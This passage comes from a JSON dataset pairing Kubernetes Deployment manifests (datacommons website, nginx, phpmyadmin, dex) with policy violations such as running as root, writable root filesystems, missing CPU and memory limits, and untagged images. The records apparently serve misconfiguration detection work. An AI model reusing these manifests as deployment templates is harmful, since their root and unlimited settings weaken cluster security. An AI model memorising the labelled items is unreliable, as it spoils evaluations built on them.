    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: website-app\n  template:\n    metadata:\n      labels:\n        app: website-app\n    spec:\n      serviceAccountName: website-ksa\n      volumes:\n      - name: schema-mapping\n        configMap:\n          name: schema-mapping\n      - name: ai-config\n        configMap:\n          name: ai-config\n      - name: memdb-config\n        configMap:\n          name: memdb-config\n      containers:\n      - name: website\n        image: gcr.io/datcom-ci/datacommons-website:latest\n        imagePullPolicy: Always\n        args: []\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          failureThreshold: 1\n          periodSeconds: 10\n        resources:\n          limits:\n            memory: 3G\n          requests:\n            memory: 3G\n        volumeMounts:\n        - name: ai-config\n          mountPath: /datacommons/ai\n        env:\n        - name: FLASK_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: flaskEnv\n        - name: SECRET_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: secretProject\n        - name: WEBSITE_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: website_hash.txt\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: BOUNCE\n          value: dummy\n      - name: mixer\n        image: gcr.io/datcom-ci/datacommons-mixer:latest\n        imagePullPolicy: Always\n        resources:\n          limits:\n            memory: 6G\n          requests:\n            memory: 6G\n        args:\n        - --mixer_project=$(MIXER_PROJECT)\n        - --store_project=$(STORE_PROJECT)\n        - --bq_dataset=$(BIG_QUERY)\n        - --serve_recon_service=true\n        - --schema_path=/datacommons/mapping\n        - --import_group_tables=$(IMPORT_GROUP_TABLES)\n        - --memdb_path=/datacommons/memdb\n        volumeMounts:\n        - name: schema-mapping\n          mountPath: /datacommons/mapping\n        - name: memdb-config\n          mountPath: /datacommons/memdb\n        env:\n        - name: MIXER_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: mixerProject\n        - name: STORE_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: store.project\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: IMPORT_GROUP_TABLES\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigtable_import_groups.version\n        - name: MIXER_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: mixer_hash.txt\n        ports:\n        - containerPort: 12345\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n          initialDelaySeconds: 10\n      - name: esp\n        image: gcr.io/endpoints-release/endpoints-runtime:1\n        args:\n        - --service=$(SERVICE_NAME)\n        - --rollout_strategy=managed\n        - --http_port=8081\n        - --backend=grpc://127.0.0.1:12345\n        - --cors_preset=basic\n        - --healthz=healthz\n        env:\n        - name: SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: serviceName\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n          initialDelaySeconds: 5\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"website\" is not set to runAsNonRoot"
  },
  {
    "id": "8564",
    "manifest_path": "data/manifests/the_stack_sample/sample_3200.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: website-app\n  template:\n    metadata:\n      labels:\n        app: website-app\n    spec:\n      serviceAccountName: website-ksa\n      volumes:\n      - name: schema-mapping\n        configMap:\n          name: schema-mapping\n      - name: ai-config\n        configMap:\n          name: ai-config\n      - name: memdb-config\n        configMap:\n          name: memdb-config\n      containers:\n      - name: website\n        image: gcr.io/datcom-ci/datacommons-website:latest\n        imagePullPolicy: Always\n        args: []\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          failureThreshold: 1\n          periodSeconds: 10\n        resources:\n          limits:\n            memory: 3G\n          requests:\n            memory: 3G\n        volumeMounts:\n        - name: ai-config\n          mountPath: /datacommons/ai\n        env:\n        - name: FLASK_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: flaskEnv\n        - name: SECRET_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: secretProject\n        - name: WEBSITE_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: website_hash.txt\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: BOUNCE\n          value: dummy\n      - name: mixer\n        image: gcr.io/datcom-ci/datacommons-mixer:latest\n        imagePullPolicy: Always\n        resources:\n          limits:\n            memory: 6G\n          requests:\n            memory: 6G\n        args:\n        - --mixer_project=$(MIXER_PROJECT)\n        - --store_project=$(STORE_PROJECT)\n        - --bq_dataset=$(BIG_QUERY)\n        - --serve_recon_service=true\n        - --schema_path=/datacommons/mapping\n        - --import_group_tables=$(IMPORT_GROUP_TABLES)\n        - --memdb_path=/datacommons/memdb\n        volumeMounts:\n        - name: schema-mapping\n          mountPath: /datacommons/mapping\n        - name: memdb-config\n          mountPath: /datacommons/memdb\n        env:\n        - name: MIXER_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: mixerProject\n        - name: STORE_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: store.project\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: IMPORT_GROUP_TABLES\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigtable_import_groups.version\n        - name: MIXER_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: mixer_hash.txt\n        ports:\n        - containerPort: 12345\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n          initialDelaySeconds: 10\n      - name: esp\n        image: gcr.io/endpoints-release/endpoints-runtime:1\n        args:\n        - --service=$(SERVICE_NAME)\n        - --rollout_strategy=managed\n        - --http_port=8081\n        - --backend=grpc://127.0.0.1:12345\n        - --cors_preset=basic\n        - --healthz=healthz\n        env:\n        - name: SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: serviceName\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n          initialDelaySeconds: 5\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"esp\" has cpu request 0"
  },
  {
    "id": "8565",
    "manifest_path": "data/manifests/the_stack_sample/sample_3200.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: website-app\n  template:\n    metadata:\n      labels:\n        app: website-app\n    spec:\n      serviceAccountName: website-ksa\n      volumes:\n      - name: schema-mapping\n        configMap:\n          name: schema-mapping\n      - name: ai-config\n        configMap:\n          name: ai-config\n      - name: memdb-config\n        configMap:\n          name: memdb-config\n      containers:\n      - name: website\n        image: gcr.io/datcom-ci/datacommons-website:latest\n        imagePullPolicy: Always\n        args: []\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          failureThreshold: 1\n          periodSeconds: 10\n        resources:\n          limits:\n            memory: 3G\n          requests:\n            memory: 3G\n        volumeMounts:\n        - name: ai-config\n          mountPath: /datacommons/ai\n        env:\n        - name: FLASK_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: flaskEnv\n        - name: SECRET_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: secretProject\n        - name: WEBSITE_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: website_hash.txt\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: BOUNCE\n          value: dummy\n      - name: mixer\n        image: gcr.io/datcom-ci/datacommons-mixer:latest\n        imagePullPolicy: Always\n        resources:\n          limits:\n            memory: 6G\n          requests:\n            memory: 6G\n        args:\n        - --mixer_project=$(MIXER_PROJECT)\n        - --store_project=$(STORE_PROJECT)\n        - --bq_dataset=$(BIG_QUERY)\n        - --serve_recon_service=true\n        - --schema_path=/datacommons/mapping\n        - --import_group_tables=$(IMPORT_GROUP_TABLES)\n        - --memdb_path=/datacommons/memdb\n        volumeMounts:\n        - name: schema-mapping\n          mountPath: /datacommons/mapping\n        - name: memdb-config\n          mountPath: /datacommons/memdb\n        env:\n        - name: MIXER_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: mixerProject\n        - name: STORE_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: store.project\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: IMPORT_GROUP_TABLES\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigtable_import_groups.version\n        - name: MIXER_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: mixer_hash.txt\n        ports:\n        - containerPort: 12345\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n          initialDelaySeconds: 10\n      - name: esp\n        image: gcr.io/endpoints-release/endpoints-runtime:1\n        args:\n        - --service=$(SERVICE_NAME)\n        - --rollout_strategy=managed\n        - --http_port=8081\n        - --backend=grpc://127.0.0.1:12345\n        - --cors_preset=basic\n        - --healthz=healthz\n        env:\n        - name: SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: serviceName\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n          initialDelaySeconds: 5\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mixer\" has cpu request 0"
  },
  {
    "id": "8566",
    "manifest_path": "data/manifests/the_stack_sample/sample_3200.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: website-app\n  template:\n    metadata:\n      labels:\n        app: website-app\n    spec:\n      serviceAccountName: website-ksa\n      volumes:\n      - name: schema-mapping\n        configMap:\n          name: schema-mapping\n      - name: ai-config\n        configMap:\n          name: ai-config\n      - name: memdb-config\n        configMap:\n          name: memdb-config\n      containers:\n      - name: website\n        image: gcr.io/datcom-ci/datacommons-website:latest\n        imagePullPolicy: Always\n        args: []\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          failureThreshold: 1\n          periodSeconds: 10\n        resources:\n          limits:\n            memory: 3G\n          requests:\n            memory: 3G\n        volumeMounts:\n        - name: ai-config\n          mountPath: /datacommons/ai\n        env:\n        - name: FLASK_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: flaskEnv\n        - name: SECRET_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: secretProject\n        - name: WEBSITE_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: website_hash.txt\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: BOUNCE\n          value: dummy\n      - name: mixer\n        image: gcr.io/datcom-ci/datacommons-mixer:latest\n        imagePullPolicy: Always\n        resources:\n          limits:\n            memory: 6G\n          requests:\n            memory: 6G\n        args:\n        - --mixer_project=$(MIXER_PROJECT)\n        - --store_project=$(STORE_PROJECT)\n        - --bq_dataset=$(BIG_QUERY)\n        - --serve_recon_service=true\n        - --schema_path=/datacommons/mapping\n        - --import_group_tables=$(IMPORT_GROUP_TABLES)\n        - --memdb_path=/datacommons/memdb\n        volumeMounts:\n        - name: schema-mapping\n          mountPath: /datacommons/mapping\n        - name: memdb-config\n          mountPath: /datacommons/memdb\n        env:\n        - name: MIXER_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: mixerProject\n        - name: STORE_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: store.project\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: IMPORT_GROUP_TABLES\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigtable_import_groups.version\n        - name: MIXER_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: mixer_hash.txt\n        ports:\n        - containerPort: 12345\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n          initialDelaySeconds: 10\n      - name: esp\n        image: gcr.io/endpoints-release/endpoints-runtime:1\n        args:\n        - --service=$(SERVICE_NAME)\n        - --rollout_strategy=managed\n        - --http_port=8081\n        - --backend=grpc://127.0.0.1:12345\n        - --cors_preset=basic\n        - --healthz=healthz\n        env:\n        - name: SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: serviceName\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n          initialDelaySeconds: 5\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"website\" has cpu request 0"
  },
  {
    "id": "8567",
    "manifest_path": "data/manifests/the_stack_sample/sample_3202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: unhealthy-app\n  name: unhealthy-app\n  namespace: test-gslb\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      run: unhealthy-app\n  template:\n    metadata:\n      labels:\n        run: unhealthy-app\n    spec:\n      containers:\n      - image: nginx\n        imagePullPolicy: Always\n        name: unhealthy-app\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"unhealthy-app\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8568",
    "manifest_path": "data/manifests/the_stack_sample/sample_3202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: unhealthy-app\n  name: unhealthy-app\n  namespace: test-gslb\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      run: unhealthy-app\n  template:\n    metadata:\n      labels:\n        run: unhealthy-app\n    spec:\n      containers:\n      - image: nginx\n        imagePullPolicy: Always\n        name: unhealthy-app\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"unhealthy-app\" does not have a read-only root file system"
  },
  {
    "id": "8569",
    "manifest_path": "data/manifests/the_stack_sample/sample_3202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: unhealthy-app\n  name: unhealthy-app\n  namespace: test-gslb\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      run: unhealthy-app\n  template:\n    metadata:\n      labels:\n        run: unhealthy-app\n    spec:\n      containers:\n      - image: nginx\n        imagePullPolicy: Always\n        name: unhealthy-app\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"unhealthy-app\" is not set to runAsNonRoot"
  },
  {
    "id": "8570",
    "manifest_path": "data/manifests/the_stack_sample/sample_3202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: unhealthy-app\n  name: unhealthy-app\n  namespace: test-gslb\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      run: unhealthy-app\n  template:\n    metadata:\n      labels:\n        run: unhealthy-app\n    spec:\n      containers:\n      - image: nginx\n        imagePullPolicy: Always\n        name: unhealthy-app\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"unhealthy-app\" has cpu request 0"
  },
  {
    "id": "8571",
    "manifest_path": "data/manifests/the_stack_sample/sample_3202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: unhealthy-app\n  name: unhealthy-app\n  namespace: test-gslb\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      run: unhealthy-app\n  template:\n    metadata:\n      labels:\n        run: unhealthy-app\n    spec:\n      containers:\n      - image: nginx\n        imagePullPolicy: Always\n        name: unhealthy-app\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"unhealthy-app\" has memory limit 0"
  },
  {
    "id": "8572",
    "manifest_path": "data/manifests/the_stack_sample/sample_3204.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: phpmyadmin\n  namespace: wordpress-stack\n  labels:\n    app.kubernetes.io/name: phpmyadmin\n    app.kubernetes.io/tier: frontend\n    app.kubernetes.io/version: '0.1'\n    app.kubernetes.io/environment: dev\n    app.kubernetes.io/namespace: wordpress-stack\n    app.kubernetes.io/part-of: wordpress-project\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: phpmyadmin\n      app.kubernetes.io/tier: frontend\n      app.kubernetes.io/version: '0.1'\n      app.kubernetes.io/environment: dev\n      app.kubernetes.io/namespace: wordpress-stack\n      app.kubernetes.io/part-of: wordpress-project\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: phpmyadmin\n        app.kubernetes.io/tier: frontend\n        app.kubernetes.io/version: '0.1'\n        app.kubernetes.io/environment: dev\n        app.kubernetes.io/namespace: wordpress-stack\n        app.kubernetes.io/part-of: wordpress-project\n    spec:\n      containers:\n      - name: phpmyadmin\n        image: phpmyadmin:5.1\n        envFrom:\n        - configMapRef:\n            name: phpmyadmin-config\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"phpmyadmin\" does not have a read-only root file system"
  },
  {
    "id": "8573",
    "manifest_path": "data/manifests/the_stack_sample/sample_3204.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: phpmyadmin\n  namespace: wordpress-stack\n  labels:\n    app.kubernetes.io/name: phpmyadmin\n    app.kubernetes.io/tier: frontend\n    app.kubernetes.io/version: '0.1'\n    app.kubernetes.io/environment: dev\n    app.kubernetes.io/namespace: wordpress-stack\n    app.kubernetes.io/part-of: wordpress-project\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: phpmyadmin\n      app.kubernetes.io/tier: frontend\n      app.kubernetes.io/version: '0.1'\n      app.kubernetes.io/environment: dev\n      app.kubernetes.io/namespace: wordpress-stack\n      app.kubernetes.io/part-of: wordpress-project\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: phpmyadmin\n        app.kubernetes.io/tier: frontend\n        app.kubernetes.io/version: '0.1'\n        app.kubernetes.io/environment: dev\n        app.kubernetes.io/namespace: wordpress-stack\n        app.kubernetes.io/part-of: wordpress-project\n    spec:\n      containers:\n      - name: phpmyadmin\n        image: phpmyadmin:5.1\n        envFrom:\n        - configMapRef:\n            name: phpmyadmin-config\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"phpmyadmin\" is not set to runAsNonRoot"
  },
  {
    "id": "8574",
    "manifest_path": "data/manifests/the_stack_sample/sample_3204.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: phpmyadmin\n  namespace: wordpress-stack\n  labels:\n    app.kubernetes.io/name: phpmyadmin\n    app.kubernetes.io/tier: frontend\n    app.kubernetes.io/version: '0.1'\n    app.kubernetes.io/environment: dev\n    app.kubernetes.io/namespace: wordpress-stack\n    app.kubernetes.io/part-of: wordpress-project\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: phpmyadmin\n      app.kubernetes.io/tier: frontend\n      app.kubernetes.io/version: '0.1'\n      app.kubernetes.io/environment: dev\n      app.kubernetes.io/namespace: wordpress-stack\n      app.kubernetes.io/part-of: wordpress-project\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: phpmyadmin\n        app.kubernetes.io/tier: frontend\n        app.kubernetes.io/version: '0.1'\n        app.kubernetes.io/environment: dev\n        app.kubernetes.io/namespace: wordpress-stack\n        app.kubernetes.io/part-of: wordpress-project\n    spec:\n      containers:\n      - name: phpmyadmin\n        image: phpmyadmin:5.1\n        envFrom:\n        - configMapRef:\n            name: phpmyadmin-config\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"phpmyadmin\" has cpu request 0"
  },
  {
    "id": "8575",
    "manifest_path": "data/manifests/the_stack_sample/sample_3204.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: phpmyadmin\n  namespace: wordpress-stack\n  labels:\n    app.kubernetes.io/name: phpmyadmin\n    app.kubernetes.io/tier: frontend\n    app.kubernetes.io/version: '0.1'\n    app.kubernetes.io/environment: dev\n    app.kubernetes.io/namespace: wordpress-stack\n    app.kubernetes.io/part-of: wordpress-project\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: phpmyadmin\n      app.kubernetes.io/tier: frontend\n      app.kubernetes.io/version: '0.1'\n      app.kubernetes.io/environment: dev\n      app.kubernetes.io/namespace: wordpress-stack\n      app.kubernetes.io/part-of: wordpress-project\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: phpmyadmin\n        app.kubernetes.io/tier: frontend\n        app.kubernetes.io/version: '0.1'\n        app.kubernetes.io/environment: dev\n        app.kubernetes.io/namespace: wordpress-stack\n        app.kubernetes.io/part-of: wordpress-project\n    spec:\n      containers:\n      - name: phpmyadmin\n        image: phpmyadmin:5.1\n        envFrom:\n        - configMapRef:\n            name: phpmyadmin-config\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"phpmyadmin\" has memory limit 0"
  },
  {
    "id": "8576",
    "manifest_path": "data/manifests/the_stack_sample/sample_3205.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: dex\n  name: dex\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: dex\n  template:\n    metadata:\n      labels:\n        app: dex\n    spec:\n      serviceAccountName: dex\n      containers:\n      - image: uhub.service.ucloud.cn/a4x-kubeflow/dexidp/dex:v2.22.0\n        name: dex\n        command:\n        - dex\n        - serve\n        - /etc/dex/cfg/config.yaml\n        ports:\n        - name: http\n          containerPort: 5556\n        volumeMounts:\n        - name: config\n          mountPath: /etc/dex/cfg\n      volumes:\n      - name: config\n        configMap:\n          name: dex\n          items:\n          - key: config.yaml\n            path: config.yaml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dex\" does not have a read-only root file system"
  },
  {
    "id": "8577",
    "manifest_path": "data/manifests/the_stack_sample/sample_3205.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: dex\n  name: dex\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: dex\n  template:\n    metadata:\n      labels:\n        app: dex\n    spec:\n      serviceAccountName: dex\n      containers:\n      - image: uhub.service.ucloud.cn/a4x-kubeflow/dexidp/dex:v2.22.0\n        name: dex\n        command:\n        - dex\n        - serve\n        - /etc/dex/cfg/config.yaml\n        ports:\n        - name: http\n          containerPort: 5556\n        volumeMounts:\n        - name: config\n          mountPath: /etc/dex/cfg\n      volumes:\n      - name: config\n        configMap:\n          name: dex\n          items:\n          - key: config.yaml\n            path: config.yaml\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"dex\" not found"
  },
  {
    "id": "8578",
    "manifest_path": "data/manifests/the_stack_sample/sample_3205.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: dex\n  name: dex\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: dex\n  template:\n    metadata:\n      labels:\n        app: dex\n    spec:\n      serviceAccountName: dex\n      containers:\n      - image: uhub.service.ucloud.cn/a4x-kubeflow/dexidp/dex:v2.22.0\n        name: dex\n        command:\n        - dex\n        - serve\n        - /etc/dex/cfg/config.yaml\n        ports:\n        - name: http\n          containerPort: 5556\n        volumeMounts:\n        - name: config\n          mountPath: /etc/dex/cfg\n      volumes:\n      - name: config\n        configMap:\n          name: dex\n          items:\n          - key: config.yaml\n            path: config.yaml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dex\" is not set to runAsNonRoot"
  },
  {
    "id": "8579",
    "manifest_path": "data/manifests/the_stack_sample/sample_3205.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: dex\n  name: dex\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: dex\n  template:\n    metadata:\n      labels:\n        app: dex\n    spec:\n      serviceAccountName: dex\n      containers:\n      - image: uhub.service.ucloud.cn/a4x-kubeflow/dexidp/dex:v2.22.0\n        name: dex\n        command:\n        - dex\n        - serve\n        - /etc/dex/cfg/config.yaml\n        ports:\n        - name: http\n          containerPort: 5556\n        volumeMounts:\n        - name: config\n          mountPath: /etc/dex/cfg\n      volumes:\n      - name: config\n        configMap:\n          name: dex\n          items:\n          - key: config.yaml\n            path: config.yaml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dex\" has cpu request 0"
  },
  {
    "id": "8580",
    "manifest_path": "data/manifests/the_stack_sample/sample_3205.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: dex\n  name: dex\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: dex\n  template:\n    metadata:\n      labels:\n        app: dex\n    spec:\n      serviceAccountName: dex\n      containers:\n      - image: uhub.service.ucloud.cn/a4x-kubeflow/dexidp/dex:v2.22.0\n        name: dex\n        command:\n        - dex\n        - serve\n        - /etc/dex/cfg/config.yaml\n        ports:\n        - name: http\n          containerPort: 5556\n        volumeMounts:\n        - name: config\n          mountPath: /etc/dex/cfg\n      volumes:\n      - name: config\n        configMap:\n          name: dex\n          items:\n          - key: config.yaml\n            path: config.yaml\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"dex\" has memory limit 0"
  },
  {
    "id": "8581",
    "manifest_path": "data/manifests/the_stack_sample/sample_3208.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-eventstore\n  labels:\n    project: entropy\n    lab: event-journal-playground\nspec:\n  selector:\n    matchLabels:\n      app: frontend-eventstore\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: frontend-eventstore\n        track: stable\n        project: entropy\n        lab: event-journal-playground\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15\n        volumeMounts:\n        - name: nginx-eventstore-frontend-conf\n          mountPath: /etc/nginx/conf.d\n      volumes:\n      - name: nginx-eventstore-frontend-conf\n        configMap:\n          name: nginx-eventstore-frontend-conf\n          items:\n          - key: nginx-configmap.conf\n            path: nginx-configmap.conf\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8582",
    "manifest_path": "data/manifests/the_stack_sample/sample_3208.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-eventstore\n  labels:\n    project: entropy\n    lab: event-journal-playground\nspec:\n  selector:\n    matchLabels:\n      app: frontend-eventstore\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: frontend-eventstore\n        track: stable\n        project: entropy\n        lab: event-journal-playground\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15\n        volumeMounts:\n        - name: nginx-eventstore-frontend-conf\n          mountPath: /etc/nginx/conf.d\n      volumes:\n      - name: nginx-eventstore-frontend-conf\n        configMap:\n          name: nginx-eventstore-frontend-conf\n          items:\n          - key: nginx-configmap.conf\n            path: nginx-configmap.conf\n",
    "policy_id": "run-as-non-root",
